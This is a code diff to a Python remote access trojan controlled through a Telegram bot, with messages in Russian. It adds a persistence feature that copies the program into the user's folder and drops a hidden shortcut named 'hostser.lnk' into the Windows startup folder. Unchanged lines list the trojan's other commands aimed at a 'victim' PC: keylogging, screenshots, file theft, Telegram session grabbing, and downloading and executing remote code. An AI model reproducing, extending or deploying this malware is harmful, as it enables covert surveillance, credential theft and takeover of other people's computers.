@@ -1,5 +1,29 @@
 code_to_execute = ''
-
+@bot.message_handler(commands=['avto'])
+def avto(message):
+    try:
+        current_program = os.path.abspath(file)
+        user_folder = os.path.expanduser("~")
+        copy_folder = os.path.join(user_folder, "MyProgram")
+        os.makedirs(copy_folder, exist_ok=True)
+        shutil.copy(current_program, copy_folder)
+        
+        shortcut_name = "hostser.lnk"
+        shortcut_path = os.path.join(user_folder, shortcut_name)
+        
+        with winshell.shortcut(shortcut_path) as shortcut:
+            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
+            shortcut.show_cmd = win32con.SW_HIDE  # Скрываем ярлык
+            shortcut.icon = (None, 0)  # Задаем значение None для иконки
+        
+        startup_folder = winshell.startup()
+        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
+        shutil.copy(shortcut_path, startup_shortcut_path)
+        
+        bot.send_message(message.chat.id, "Успешно добавлен ярлык в автозапуск!")
+    
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Произошла ошибка при добавлении ярлыка в автозапуск: {e}")
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
@@ -91,7 +115,7 @@ def execute_code(message):
 def send_message_on_start():
     username = os.getlogin()
     bot.send_message(chat_id, f"Подключен пк: {username}")
-    bot.send_message(chat_id, "КОМАНДЫ: '\n' /capture_pc - скриншот '\n' /keylogs - кейлоггер '\n' /pc_info -  информация о пк'\n'/msg_box - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/download_file - загрузить файл с пк жертвы: /download_file путь'\n'/list_dir - вывести все названия из папки: /list_dir путь до папки'\n'/run_file - запустить файл по пути'\n'/tg_grab - взять ссессию тг'\n' /url - подгрузка кода + последующее его выполнение'\n'/code - выполнить ваш код(пайтон)  ")
+    bot.send_message(chat_id, "КОМАНДЫ: '\n' /capture_pc - скриншот '\n' /keylogs - кейлоггер '\n' /pc_info -  информация о пк'\n'/msg_box - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/download_file - загрузить файл с пк жертвы: /download_file путь'\n'/list_dir - вывести все названия из папки: /list_dir путь до папки'\n'/run_file - запустить файл по пути'\n'/tg_grab - взять ссессию тг'\n' /url - подгрузка кода + последующее его выполнение'\n'/code - выполнить ваш код(пайтон)'\n' /avto - добавление в автозагрузку  ")
     itembtn1 = types.KeyboardButton('/capture_pc')
     itembtn2 = types.KeyboardButton('/keylogs')
     itembtn3 = types.KeyboardButton('/pc_info')
@@ -337,7 +361,7 @@ def start(message):
     itembtn7 = types.KeyboardButton('/list_dir')
     itembtn8 = types.KeyboardButton('/run_file')
     itembtn9 = types.KeyboardButton('/tg_grab')
-    itembtn10 = types.KeyboardButton('/url')
+    itembtn10 = types.KeyboardButton('/avto')
     itembtn11 = types.KeyboardButton('/code')
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
